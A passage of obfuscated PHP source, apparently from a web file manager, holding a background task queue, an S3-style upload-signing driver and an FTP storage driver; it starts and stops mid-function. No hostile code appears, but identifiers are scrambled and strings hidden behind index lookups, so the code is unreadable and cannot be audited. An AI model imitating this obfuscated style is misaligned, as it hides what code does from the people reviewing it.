$dó›µ”ØÌœ = 10; while (!0) { $cêÒ¶Æ—·í = TaskQueue::run(); if ($cêÒ¶Æ—·í === !1) { break; } if (timeFloat() - $Fù¶¼â›É >= $dó›µ”ØÌœ) { break; } } } private static function taskTimeCheck($d‰ƒË×ßÃÉ) { goto b¯‰®‰ÛÒÓ; cæø›çšĞ¨: switch ($C’©¢ˆƒå·[$FŠñàš¥‰ä[29]]) { case $FŠñàš¥‰ä[1469]: if (time() - $a£‰‰¾âŒ× < 3600 * 24 * 30) { return !1; } if ($C’©¢ˆƒå·[$FŠñàš¥‰ä[1469]] == date($FŠñàš¥‰ä[1470]) && $aÜ©š×È®) { return !0; } break; case $FŠñàš¥‰ä[1471]: if (time() - $a£‰‰¾âŒ× < 3600 * 24 * 7) { return !1; } $cã×¼„¬”ã = date($FŠñàš¥‰ä[1472]) == 0 ? 7 : date($FŠñàš¥‰ä[1472]); if ($C’©¢ˆƒå·[$FŠñàš¥‰ä[1471]] == $cã×¼„¬”ã && $aÜ©š×È®) { return !0; } break; case $FŠñàš¥‰ä[1464]: if (time() - $a£‰‰¾âŒ× < 3600 * 24) { return !1; } if ($aÜ©š×È®) { return !0; } break; case $FŠñàš¥‰ä[1473]: if (time() - $a£‰‰¾âŒ× >= floatval($C’©¢ˆƒå·[$FŠñàš¥‰ä[1473]]) * 60) { return !0; } break; default: break; } return !1; goto aÜéªãñ‡; b¯‰®‰ÛÒÓ: $FŠñàš¥‰ä =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C’©¢ˆƒå· = json_decode($d‰ƒË×ßÃÉ[$FŠñàš¥‰ä[193]], !0); $a£‰‰¾âŒ× = intval($d‰ƒË×ßÃÉ[$FŠñàš¥‰ä[1454]]); goto BÊòÂ¾Ç­; BÊòÂ¾Ç­: $eéåÒÑŒ = strtotime($FŠñàš¥‰ä[1463] . $C’©¢ˆƒå·[$FŠñàš¥‰ä[1464]] . $FŠñàš¥‰ä[1465]) - strtotime($FŠñàš¥‰ä[1466]); $bÉ…¹Ğ‘… = time() - strtotime(date($FŠñàš¥‰ä[1467]) . $FŠñàš¥‰ä[1468]); $aÜ©š×È® = $bÉ…¹Ğ‘… >= $eéåÒÑŒ && $bÉ…¹Ğ‘… <= $eéåÒÑŒ + 3600; goto cæø›çšĞ¨; aÜéªãñ‡: } private static function closeDatabase() { goto BŸõ­‘„ù; BŸõ­‘„ù: $cè¢§é¼¸ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; static $C…ïñÈ„öó = 0; $C„İ¢ÀéÚó = 1800; goto bÒ×íŠİé­; bÒ×íŠİé­: if (!$C…ïñÈ„öó) { $C…ïñÈ„öó = time(); } if (time() - $C…ïñÈ„öó < $C„İ¢ÀéÚó) { return; } $C…ïñÈ„öó = time(); goto Fñ»×Ÿ°—ß; Fñ»×Ÿ°—ß: $f½ïõÓÁõ¡ = Model($cè¢§é¼¸[491])->db($cè¢§é¼¸[33]); if ($f½ïõÓÁõ¡) { $f½ïõÓÁõ¡->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($cè¢§é¼¸[1474], $cè¢§é¼¸[1475]); die; } goto d—ˆëŒÔ´; d—ˆëŒÔ´: } public static function taskRun($f‡Å‹Ó×‹) { goto eƒø…”¡Ñ¨; B¥ôöª˜ø: Model($e°„Û÷Û…±[1480])->add(array($e°„Û÷Û…±[1481] => $e°„Û÷Û…±[33], $e°„Û÷Û…±[1482] => $e°„Û÷Û…±[485], $e°„Û÷Û…±[29] => $e°„Û÷Û…±[1483] . $f‡Å‹Ó×‹[$e°„Û÷Û…±[383]], $e°„Û÷Û…±[1484] => json_encode(array($e°„Û÷Û…±[28] => $f‡Å‹Ó×‹[$e°„Û÷Û…±[28]], $e°„Û÷Û…±[1485] => timeFloat() - $bî‹­¤ä, $e°„Û÷Û…±[287] => $aœ¶ñµêÚØ)))); self::log($e°„Û÷Û…±[1486] . $f‡Å‹Ó×‹[$e°„Û÷Û…±[383]] . $e°„Û÷Û…±[1487] . $aœ¶ñµêÚØ); return !0; goto dÓ’ÌÇÎÃ¦; eƒø…”¡Ñ¨: $e°„Û÷Û…± =& $_SERVER[ÈİÅ¿ÈÈ¥×]; self::log($e°„Û÷Û…±[1476] . $f‡Å‹Ó×‹[$e°„Û÷Û…±[383]] . $e°„Û÷Û…±[1477] . $f‡Å‹Ó×‹[$e°„Û÷Û…±[28]] . $e°„Û÷Û…±[1478] . $f‡Å‹Ó×‹[$e°„Û÷Û…±[1479]]); Model($e°„Û÷Û…±[1460])->run($f‡Å‹Ó×‹[$e°„Û÷Û…±[383]]); goto e—Ì·½ëƒ´; e—Ì·½ëƒ´: $bî‹­¤ä = timeFloat(); $aœ¶ñµêÚØ = $e°„Û÷Û…±[33]; switch ($f‡Å‹Ó×‹[$e°„Û÷Û…±[29]]) { case $e°„Û÷Û…±[301]: $fÈì¬Î’Ó = url_request($f‡Å‹Ó×‹[$e°„Û÷Û…±[1479]], $e°„Û÷Û…±[224], !1, !1, !1, !1, 5); $aœ¶ñµêÚØ = strlen($fÈì¬Î’Ó); break; case $e°„Û÷Û…±[223]: $aœ¶ñµêÚØ = Hook::apply($f‡Å‹Ó×‹[$e°„Û÷Û…±[1479]]); default: break; } goto B¥ôöª˜ø; dÓ’ÌÇÎÃ¦: } private static function valueGet($bçÜ…Ûå…Ú) { $c˜İ‰çøæÅ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Dî­Í’ÀÅ„ = $c˜İ‰çøæÅ[1488]; $bª’¬íÊš­ = Model($c˜İ‰çøæÅ[1489])->get($bçÜ…Ûå…Ú, $Dî­Í’ÀÅ„); if (is_null($bª’¬íÊš­)) { Model($c˜İ‰çøæÅ[1489])->set($c˜İ‰çøæÅ[1458], 10, $Dî­Í’ÀÅ„); Model($c˜İ‰çøæÅ[1489])->set($c˜İ‰çøæÅ[697], $c˜İ‰çøæÅ[83], $Dî­Í’ÀÅ„); Model($c˜İ‰çøæÅ[1489])->set($c˜İ‰çøæÅ[1453], $c˜İ‰çøæÅ[485], $Dî­Í’ÀÅ„); $bª’¬íÊš­ = Model($c˜İ‰çøæÅ[1489])->get($bçÜ…Ûå…Ú, $Dî­Í’ÀÅ„); } return $bª’¬íÊš­; } private static function valueSet($Bìò–ŞÎŒË, $f¡ç‚½º¤Œ) { $AõÊ¼ô¦Û© =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return Model($AõÊ¼ô¦Û©[1489])->set($Bìò–ŞÎŒË, $f¡ç‚½º¤Œ, $AõÊ¼ô¦Û©[1488]); } protected static function log($aìæËƒŠ½Î) { write_log($aìæËƒŠ½Î, $_SERVER[ÈİÅ¿ÈÈ¥×][1475]); } private static function cacheClear() { $cÆÆ§èµÕ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BÍ¤™ŞºÑ = Model($cÆÆ§èµÕ[1489])->cacheKey($cÆÆ§èµÕ[1488]); Cache::clearMemory($BÍ¤™ŞºÑ); Model($cÆÆ§èµÕ[1460])->cacheClear(); } } class Task { const STATYS_STOP = "\x73\164\x6f\160"; const STATYS_RUNNING = "\162\x75\x6e\x6e\x69\x6e\147"; const STATYS_KILL = "\153\151\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($A¥æ‘Ú •ë, $BÕì ‚ÜÛ = '', $C»§àŠíÚ‘ = 0, $b‰½¬ë•‚ˆ = '') { goto AŠÆÍˆ‘Ú¯; AŠÆÍˆ‘Ú¯: $C¦•Ñ—ËìÙ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (self::get($A¥æ‘Ú •ë)) { return; } $this->task = array($C¦•Ñ—ËìÙ[383] => $A¥æ‘Ú •ë, $C¦•Ñ—ËìÙ[1490] => USER_ID, $C¦•Ñ—ËìÙ[1395] => $b‰½¬ë•‚ˆ, $C¦•Ñ—ËìÙ[29] => $BÕì ‚ÜÛ, $C¦•Ñ—ËìÙ[988] => $C¦•Ñ—ËìÙ[33], $C¦•Ñ—ËìÙ[986] => $C»§àŠíÚ‘, $C¦•Ñ—ËìÙ[1000] => 0, $C¦•Ñ—ËìÙ[1491] => 0, $C¦•Ñ—ËìÙ[1492] => 0, $C¦•Ñ—ËìÙ[1493] => timeFloat(), $C¦•Ñ—ËìÙ[1494] => 0, $C¦•Ñ—ËìÙ[1495] => 0, $C¦•Ñ—ËìÙ[1496] => 0, $C¦•Ñ—ËìÙ[1497] => 0, $C¦•Ñ—ËìÙ[697] => $C¦•Ñ—ËìÙ[1453]); goto Dò…î£Ô±; däÒ›ÂÏÅ²: $this->startAfter(); Hook::trigger($C¦•Ñ—ËìÙ[1502], $this->task); $this->task[$C¦•Ñ—ËìÙ[1495]] = timeFloat(); goto e„´¨¶ŠÉ‰; Dò…î£Ô±: $GLOBALS[$C¦•Ñ—ËìÙ[1498]] = 1; Hook::bind($C¦•Ñ—ËìÙ[1455], array($this, $C¦•Ñ—ËìÙ[1499])); Hook::bind($C¦•Ñ—ËìÙ[1500], array($this, $C¦•Ñ—ËìÙ[1501])); goto däÒ›ÂÏÅ²; e„´¨¶ŠÉ‰: } public function end() { goto d¸ ÙÓ¾Ú˜; d¸ ÙÓ¾Ú˜: $fªëŸÃ²«© =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->task) { return; } if ($this->task[$fªëŸÃ²«©[1495]]) { self::valueSet($this->task[$fªëŸÃ²«©[383]], !1); } goto fòéÒÆ¥; fòéÒÆ¥: $E¹îÁÍØÆª = timeFloat() - $this->task[$fªëŸÃ²«©[1493]]; self::log($fªëŸÃ²«©[1503] . $this->task[$fªëŸÃ²«©[383]] . $fªëŸÃ²«©[1504] . $E¹îÁÍØÆª . $fªëŸÃ²«©[1505]); Hook::unbind($fªëŸÃ²«©[1455], array($this, $fªëŸÃ²«©[1499])); goto bƒªˆˆ÷¾; bƒªˆˆ÷¾: Hook::unbind($fªëŸÃ²«©[1500], array($this, $fªëŸÃ²«©[1501])); $this->endAfter(); $this->task = !1; goto FÜò·“Í¦‘; FÜò·“Í¦‘: } public function update($b¥¡ƒ¤ß½¡ = 0, $aßµ×´åø† = false) { goto cù¶àÊÔš; FÒ… ˆ…«©: $this->updateAfter(); $c†Û›öÜÀ = 0.2; if (timeFloat() - $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1495]] < $c†Û›öÜÀ && !$aßµ×´åø†) { return; } goto c®¸Ë·æ£; cù¶àÊÔš: $D¿ÈÃÏÃ´¬ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fãõ‹õ¹Ö… =& $this->task; if (!$fãõ‹õ¹Ö…) { return; } goto BíÛŞ’ ëæ; c®¸Ë·æ£: $BÚÔôïêì = self::get($fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[383]]); $e·‹ÖÁì¢‚ = $BÚÔôïêì[$D¿ÈÃÏÃ´¬[697]]; if ($e·‹ÖÁì¢‚ == self::STATYS_KILL) { $Fò·¶´ç— = array($D¿ÈÃÏÃ´¬[1506] => LNG($D¿ÈÃÏÃ´¬[1507]), $D¿ÈÃÏÃ´¬[1050] => !1); Cache::set($D¿ÈÃÏÃ´¬[1508] . $this->task[$D¿ÈÃÏÃ´¬[383]], $Fò·¶´ç—, 30); $this->end(); die; } else { if ($e·‹ÖÁì¢‚ == self::STATYS_STOP) { $bŸÑ†¶É¢ = 2; $BÚÔôïêì[$D¿ÈÃÏÃ´¬[1496]] += $bŸÑ†¶É¢; self::valueSet($fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[383]], $BÚÔôïêì); sleep($bŸÑ†¶É¢); $this->update(); return; } } goto bçëÇÒö²Æ; BíÛŞ’ ëæ: $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1000]] += $b¥¡ƒ¤ß½¡; $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1494]] = timeFloat(); if ($fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[986]]) { if ($fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[986]] < $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1000]]) { $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[986]] = $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1000]]; } $b…Ì¤·®‰ = timeFloat() - $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1493]] - $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1496]]; $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1491]] = $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1000]] / $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[986]]; $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1492]] = $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1000]] / $b…Ì¤·®‰; if ($fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1491]] > 0) { $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1497]] = $b…Ì¤·®‰ * (1 - $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1491]]) / $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1491]]; } $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1497]] = $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1497]] <= 0 ? 0 : $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1497]]; } goto FÒ… ˆ…«©; b‚¥ºíŸ–×: Hook::trigger($D¿ÈÃÏÃ´¬[1509], $fãõ‹õ¹Ö…); self::valueSet($fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[383]], $fãõ‹õ¹Ö…); goto Fİ‚÷Ò’Óä; bçëÇÒö²Æ: $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[697]] = $e·‹ÖÁì¢‚ ? $e·‹ÖÁì¢‚ : $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[697]]; $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1496]] = $BÚÔôïêì[$D¿ÈÃÏÃ´¬[1496]] ? $BÚÔôïêì[$D¿ÈÃÏÃ´¬[1496]] : 0; $fãõ‹õ¹Ö…[$D¿ÈÃÏÃ´¬[1495]] = timeFloat(); goto b‚¥ºíŸ–×; Fİ‚÷Ò’Óä: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($dæò‘‹ÔÄö) { $AãóÇ±Ã =& $_SERVER[ÈİÅ¿ÈÈ¥×]; Cache::set($AãóÇ±Ã[1508] . $this->task[$AãóÇ±Ã[383]], $dæò‘‹ÔÄö, 60); return $dæò‘‹ÔÄö; } public static function get($DÁÕ–¦´áÔ) { return self::valueGet($DÁÕ–¦´áÔ); } public static function listData() { $dŞ™ƒâ…Í = self::valueGet(); return array_sort_by($dŞ™ƒâ…Í, $_SERVER[ÈİÅ¿ÈÈ¥×][1493], !0); } public static function kill($C½ÄÚŒ¿Ô) { return self::changeStatus($C½ÄÚŒ¿Ô, self::STATYS_KILL); } public static function stop($bî×¸ÆÅµ) { return self::changeStatus($bî×¸ÆÅµ, self::STATYS_STOP); } public static function restart($a‡ÕÊáÁ‰) { return self::changeStatus($a‡ÕÊáÁ‰, self::STATYS_RUNNING); } public static function killAll() { $DÍÅ¸—‘ë =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $câê°´ğ’ = self::listData(); foreach ($câê°´ğ’ as $fØÄß¿ÑÀƒ) { self::kill($fØÄß¿ÑÀƒ[$DÍÅ¸—‘ë[383]]); } sleep(2); foreach ($câê°´ğ’ as $fØÄß¿ÑÀƒ) { self::valueSet($fØÄß¿ÑÀƒ[$DÍÅ¸—‘ë[383]], !1); } } private static function changeStatus($dç¾Âƒ×ó¥, $fºÖò¦Û•) { goto f¹ˆù”¸Ö; f¹ˆù”¸Ö: $e¥İìøÓ‰ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b¯Ñ÷³ÆÖË = self::valueGet($dç¾Âƒ×ó¥); if (!$b¯Ñ÷³ÆÖË) { return !1; } goto C‹ÅÄÛ”ó; C‹ÅÄÛ”ó: $b¯Ñ÷³ÆÖË[$e¥İìøÓ‰[697]] = $fºÖò¦Û•; self::valueSet($dç¾Âƒ×ó¥, $b¯Ñ÷³ÆÖË); self::log($e¥İìøÓ‰[1510] . $b¯Ñ÷³ÆÖË[$e¥İìøÓ‰[383]] . $e¥İìøÓ‰[1511] . $fºÖò¦Û•); goto fÏÎšÛ”…µ; fÏÎšÛ”…µ: return !0; goto F£¿Şç›øÙ; F£¿Şç›øÙ: } public static function valueGet($EÒÈ–”äÄ‚ = false) { $E††±È‹Ò =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($EÒÈ–”äÄ‚) { $C÷ê¦ö¼ê² = Model($E††±È‹Ò[415])->where(array($E††±È‹Ò[89] => $EÒÈ–”äÄ‚, $E††±È‹Ò[29] => $E††±È‹Ò[1512]))->find(); return $C÷ê¦ö¼ê² ? json_decode($C÷ê¦ö¼ê²[$E††±È‹Ò[366]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($f×‡Ç³«‹º = false) { goto A«Ÿ¥½ô¤“; e÷´²ƒš: return $fÇ›éœã¤µ; goto bŒ˜×æ›î„; cĞ˜Ã½ª: $fÇ›éœã¤µ = Model($Bî˜îÑñÔ[415])->where($d¨¼Æ‡¬ÊÇ)->select(); $fÇ›éœã¤µ = $fÇ›éœã¤µ ? $fÇ›éœã¤µ : array(); foreach ($fÇ›éœã¤µ as $DÚÕ¼•¥ƒÒ => $Cä¯±Ë¸¶‚) { $fÇ›éœã¤µ[$DÚÕ¼•¥ƒÒ] = json_decode($Cä¯±Ë¸¶‚[$Bî˜îÑñÔ[366]], !0); } goto e÷´²ƒš; A«Ÿ¥½ô¤“: $Bî˜îÑñÔ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $d¨¼Æ‡¬ÊÇ = array($Bî˜îÑñÔ[29] => $Bî˜îÑñÔ[1512]); if ($f×‡Ç³«‹º) { $d¨¼Æ‡¬ÊÇ[$Bî˜îÑñÔ[1490]] = $f×‡Ç³«‹º; } goto cĞ˜Ã½ª; bŒ˜×æ›î„: } public static function valueSet($Bæ–‘Íğ¥, $Bõï‘Ù½ÄÔ) { goto C‚–¯»ÁøÈ; aËÕÜêÑ‡ò: if (!$EÂÖÅªƒ‡ğ) { ob_start(); var_dump($Bõï‘Ù½ÄÔ); $cÚºìÔ³… = ob_get_clean(); self::log($C´–ÆÏßÊ«[1513] . json_encode_force($cÚºìÔ³…)); } if (!$Bæ–‘Íğ¥ || !$Bõï‘Ù½ÄÔ[$C´–ÆÏßÊ«[383]]) { return !1; } $FË“­Óñ­¹ = array($C´–ÆÏßÊ«[29] => $C´–ÆÏßÊ«[1512], $C´–ÆÏßÊ«[1490] => USER_ID, $C´–ÆÏßÊ«[89] => $Bæ–‘Íğ¥, $C´–ÆÏßÊ«[366] => $EÂÖÅªƒ‡ğ); goto D’Õì™Ü•; C‚–¯»ÁøÈ: $C´–ÆÏßÊ« =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$Bõï‘Ù½ÄÔ) { return Model($C´–ÆÏßÊ«[415])->where(array($C´–ÆÏßÊ«[89] => $Bæ–‘Íğ¥, $C´–ÆÏßÊ«[29] => $C´–ÆÏßÊ«[1512]))->delete(); } $EÂÖÅªƒ‡ğ = json_encode($Bõï‘Ù½ÄÔ); goto aËÕÜêÑ‡ò; D’Õì™Ü•: Model($C´–ÆÏßÊ«[415])->add($FË“­Óñ­¹, array(), !0); goto eè‡ªŒƒ…£; eè‡ªŒƒ…£: } public static function log($eëÒäçŠ) { write_log($eëÒäçŠ, $_SERVER[ÈİÅ¿ÈÈ¥×][1514]); } } goto B·áÆ‘«ˆ; bØ†Í¥‹«š: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($BÅí·‰š·é) { parent::__construct($BÅí·‰š·é); $this->signatureVersion($_SERVER[ÈİÅ¿ÈÈ¥×][208]); } public function uploadFormData($Dàùø¼î—¬, $EÌ‘ÑÁÏÁƒ = 3600) { goto CÜ¦‹ôÛ‰; CÜ¦‹ôÛ‰: $E—Öš×š£§ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F“º¢Ù½µ = $E—Öš×š£§[189]; $E³–ˆ¾¤ìß = $E—Öš×š£§[1184]; goto bˆ§ÅÆ‘äƒ; A¡­ø×¨­: $E„Õ”“Š° = $E—Öš×š£§[1186]; $D ¬Š¤ª‘¨ = $EÌ‘ÑÁÏÁƒ . $E—Öš×š£§[33]; $Eáí¼øËï = $E—Öš×š£§[1150]; goto bã„²ØŠ–; bˆ§ÅÆ‘äƒ: $Eˆö¬ç¦ = $E—Öš×š£§[59]; $cÓ˜ÆëÇÁò = gmdate($E—Öš×š£§[1185]); $f­Ò‰®ò®í = gmdate($E—Öš×š£§[698]); goto A¡­ø×¨­; CŠ¬àÏÓ’Ú: $A„ãØÎšÄÕ = array($E—Öš×š£§[207] => $E—Öš×š£§[33], $E—Öš×š£§[1196] => $E—Öš×š£§[33], $E—Öš×š£§[1154] => $F“º¢Ù½µ, $E—Öš×š£§[1158] => $Eáí¼øËï, $E—Öš×š£§[1162] => $D“óíó–‚œ, $E—Öš×š£§[1197] => $d´¡¶×†Šà, $E—Öš×š£§[1198] => $E³–ˆ¾¤ìß, $E—Öš×š£§[1199] => $cÓ˜ÆëÇÁò, $E—Öš×š£§[1200] => $D ¬Š¤ª‘¨, $E—Öš×š£§[1201] => $CÜ™¿ÌƒĞ³, $E—Öš×š£§[173] => $this->getHost()); return $A„ãØÎšÄÕ; goto EÈ™ÀÃì‰Ä; bã„²ØŠ–: $BÕº·ò¼å× = array($this->accessKey, $f­Ò‰®ò®í, $this->region, $Eˆö¬ç¦, $E„Õ”“Š°); $d´¡¶×†Šà = implode($E—Öš×š£§[8], $BÕº·ò¼å×); $fªœÃçÚÛÑ = array($E—Öš×š£§[1152] => gmdate($E—Öš×š£§[1151], strtotime($E—Öš×š£§[1187])), $E—Öš×š£§[1153] => array(array($E—Öš×š£§[1155] => $this->bucket), array($E—Öš×š£§[1154] => $F“º¢Ù½µ), array($E—Öš×š£§[1156], $E—Öš×š£§[1157], $E—Öš×š£§[33]), array($E—Öš×š£§[1156], $E—Öš×š£§[1188], $E—Öš×š£§[33]), array($E—Öš×š£§[1156], $E—Öš×š£§[1189], $E—Öš×š£§[33]), array($E—Öš×š£§[1158] => $Eáí¼øËï), array($E—Öš×š£§[1190] => $d´¡¶×†Šà), array($E—Öš×š£§[1191] => $E³–ˆ¾¤ìß), array($E—Öš×š£§[1192] => $cÓ˜ÆëÇÁò), array($E—Öš×š£§[1193] => $D ¬Š¤ª‘¨))); goto fÛ¢¤Î²·„; F¹Ç‘½åŞ´: $A»ß‰º†ãŒ = hash_hmac($E—Öš×š£§[1194], $Eˆö¬ç¦, $Dßå¢ä†¦, !0); $C«´›œ©ù = hash_hmac($E—Öš×š£§[1194], $E„Õ”“Š°, $A»ß‰º†ãŒ, !0); $CÜ™¿ÌƒĞ³ = hash_hmac($E—Öš×š£§[1194], $D“óíó–‚œ, $C«´›œ©ù); goto CŠ¬àÏÓ’Ú; fÛ¢¤Î²·„: $D“óíó–‚œ = base64_encode(json_encode($fªœÃçÚÛÑ)); $eºâ£Œ¬İ = hash_hmac($E—Öš×š£§[1194], $f­Ò‰®ò®í, $E—Öš×š£§[1195] . $this->secret, !0); $Dßå¢ä†¦ = hash_hmac($E—Öš×š£§[1194], $this->region, $eºâ£Œ¬İ, !0); goto F¹Ç‘½åŞ´; EÈ™ÀÃì‰Ä: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($aÒ¿¹®ñ¼ö) { parent::__construct(); if (count($aÒ¿¹®ñ¼ö) > 0) { $this->_init($aÒ¿¹®ñ¼ö); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($a·ñĞÄ²Ü’) { $b‹‚ïãÎ²— =& $_SERVER[ÈİÅ¿ÈÈ¥×]; global $config; $this->appCharset = $config[$b‹‚ïãÎ²—[1202]]; $this->systemCharset = $config[$b‹‚ïãÎ²—[1203]]; if (isset($a·ñĞÄ²Ü’[$b‹‚ïãÎ²—[1204]]) && $a·ñĞÄ²Ü’[$b‹‚ïãÎ²—[1204]]) { $this->systemCharset = $a·ñĞÄ²Ü’[$b‹‚ïãÎ²—[1204]]; } } public function iconvApp($AÑ•öÒŠˆ§) { return $this->iconvTo($AÑ•öÒŠˆ§, $this->systemCharset, $this->appCharset); } public function iconvSystem($Aá—ø¹«Ø) { return $this->iconvTo($Aá—ø¹«Ø, $this->appCharset, $this->systemCharset); } public function getPathOuter($båõÓ¢ÇÒ„) { goto D£óŞ¸Â; D£óŞ¸Â: $eèŸéèµ·‹ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $CÅÎÓ˜¾ = $this->iconvApp($this->pathBase); $båõÓ¢ÇÒ„ = $this->iconvApp($båõÓ¢ÇÒ„); goto b—©Û±‘¢; b—©Û±‘¢: if (substr($CÅÎÓ˜¾, 0, 2) == $eèŸéèµ·‹[1205]) { $CÅÎÓ˜¾ = BASIC_PATH . substr($CÅÎÓ˜¾, 2); } if (substr($båõÓ¢ÇÒ„, 0, 2) == $eèŸéèµ·‹[1205]) { $båõÓ¢ÇÒ„ = BASIC_PATH . substr($båõÓ¢ÇÒ„, 2); } $CÅÎÓ˜¾ = KodIO::clear($CÅÎÓ˜¾); goto e£«¾Àó¸; dÃŒ¿ç½ùÂ: return $this->pathDriver . $eèŸéèµ·‹[8] . ltrim($båõÓ¢ÇÒ„, $eèŸéèµ·‹[8]); goto E¶­Ø©Œù¥; e£«¾Àó¸: $båõÓ¢ÇÒ„ = KodIO::clear($båõÓ¢ÇÒ„); $båõÓ¢ÇÒ„ = substr($båõÓ¢ÇÒ„, strlen($CÅÎÓ˜¾)); if (empty($this->pathDriver)) { return $båõÓ¢ÇÒ„; } goto dÃŒ¿ç½ùÂ; E¶­Ø©Œù¥: } private function _init($dÏ´˜³Ä¤ = array()) { $cˆæ«Œ·Ãè =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!function_exists($cˆæ«Œ·Ãè[1206])) { throw new Exception(LNG($cˆæ«Œ·Ãè[1207])); } $this->config = $dÏ´˜³Ä¤; $this->charsetReset($dÏ´˜³Ä¤); foreach ($dÏ´˜³Ä¤ as $AÜ®¾Ê¦È” => $Cô”çÚ®ƒ) { if (isset($this->{$AÜ®¾Ê¦È”})) { $this->{$AÜ®¾Ê¦È”} = $Cô”çÚ®ƒ; } } return $this->_login($dÏ´˜³Ä¤); } private function _login($AßíÙè–è) { goto CÛöŒËƒÅÒ; CÛöŒËƒÅÒ: $CÌäØòÆÅÓ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; static $bÀ™éÙ¥å‰ = array(); $B¹À³á“¶’ = md5(json_encode($AßíÙè–è)); goto AÓáŠ†–; aÃ«òŒÖõ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $CÄƒ‹êæÚ = @ftp_login($this->connect, $this->username, $this->userpass); goto e¬³ˆ±Ï…¹; e¬³ˆ±Ï…¹: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $e¢âŠÇ¾Áô = $this->pasv == $CÌäØòÆÅÓ[83] ? !0 : !1; @ftp_pasv($this->connect, $e¢âŠÇ¾Áô); goto dó°‚ëõç; DÉ†ÎïĞŠ£: $B¿¶ËÄ×ˆ = isset($cËùòéˆˆ[$CÌäØòÆÅÓ[172]]) && $cËùòéˆˆ[$CÌäØòÆÅÓ[172]] == $CÌäØòÆÅÓ[1208] ? !0 : !1; $this->scheme = $B¿¶ËÄ×ˆ ? $CÌäØòÆÅÓ[1209] : $CÌäØòÆÅÓ[1210]; $this->port = isset($cËùòéˆˆ[$CÌäØòÆÅÓ[174]]) ? $cËùòéˆˆ[$CÌäØòÆÅÓ[174]] : 21; goto aÃ«òŒÖõ; AÓáŠ†–: if (isset($bÀ™éÙ¥å‰[$B¹À³á“¶’])) { foreach ($bÀ™éÙ¥å‰[$B¹À³á“¶’] as $C˜ƒ—Éí => $eó£®ØŸôá) { $this->{$C˜ƒ—Éí} = $eó£®ØŸôá; } return !0; } $cËùòéˆˆ = parse_url(trim($this->server, $CÌäØòÆÅÓ[8])); $this->host = $cËùòéˆˆ[$CÌäØòÆÅÓ[173]]; goto DÉ†ÎïĞŠ£; dó°‚ëõç: $bÀ™éÙ¥å‰[$B¹À³á“¶’] = array($CÌäØòÆÅÓ[1211] => $this->connect, $CÌäØòÆÅÓ[173] => $this->host, $CÌäØòÆÅÓ[172] => $this->scheme, $CÌäØòÆÅÓ[174] => $this->port); return $CÄƒ‹êæÚ; goto b’äÕÊÚ¢ƒ; b’äÕÊÚ¢ƒ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($b¾áåĞÒè, $E¢Æ‘ï¾†¸ = '', $AÌÔÓÜ¥ = REPEAT_RENAME) { if ($this->setContent($b¾áåĞÒè, $E¢Æ‘ï¾†¸)) { return $this->getPathOuter($b¾áåĞÒè); } return !1; } public function mkdir($e‡è§¢­¢“, $CÔ‘¶‘È„ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $e‡è§¢­¢“ = $this->iconvSystem($e‡è§¢­¢“); if ($this->_isFolder($e‡è§¢­¢“) || @ftp_mkdir($this->connect, $e‡è§¢­¢“)) { 